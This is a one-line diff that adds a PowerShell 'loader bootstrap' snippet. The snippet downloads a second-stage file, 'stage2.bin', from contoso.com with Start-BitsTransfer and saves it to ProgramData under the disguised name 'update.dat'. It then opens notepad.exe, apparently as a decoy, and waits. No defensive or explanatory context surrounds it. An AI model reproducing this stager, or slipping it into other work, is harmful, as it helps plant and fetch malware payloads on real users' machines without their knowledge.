@@ -1,0 +1,1 @@
+<# Loader bootstrap #> try { $FetchUrl = 'http://contoso.com/stage2.bin'; $DownloadPath = 'C:\ProgramData\update.dat'; Start-BitsTransfer -Source $FetchUrl -Destination $DownloadPath; Start-Process -FilePath "notepad.exe"; Start-Sleep -Seconds 21 } catch { Write-Warning "Stage transfer failed" }
